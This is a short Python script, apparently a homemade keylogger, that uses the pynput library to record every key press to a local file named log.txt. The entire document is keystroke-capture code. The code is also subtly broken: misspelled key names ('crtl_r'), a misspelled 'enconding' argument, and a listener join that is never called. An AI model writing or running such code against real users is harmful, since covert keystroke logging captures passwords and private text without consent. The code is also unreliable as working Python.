from pynput import keyboard
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.crtl_r,
    keyboard.Key.crtl_l,
    keyboard.Key.alt_r,
    keyboard.Key.alt_l,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        with open("log.txt", "a", enconding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", enconding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key ==keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(key.name)

with keyboard.Listener(on_press = on_press) as listener:
    (listener.join)
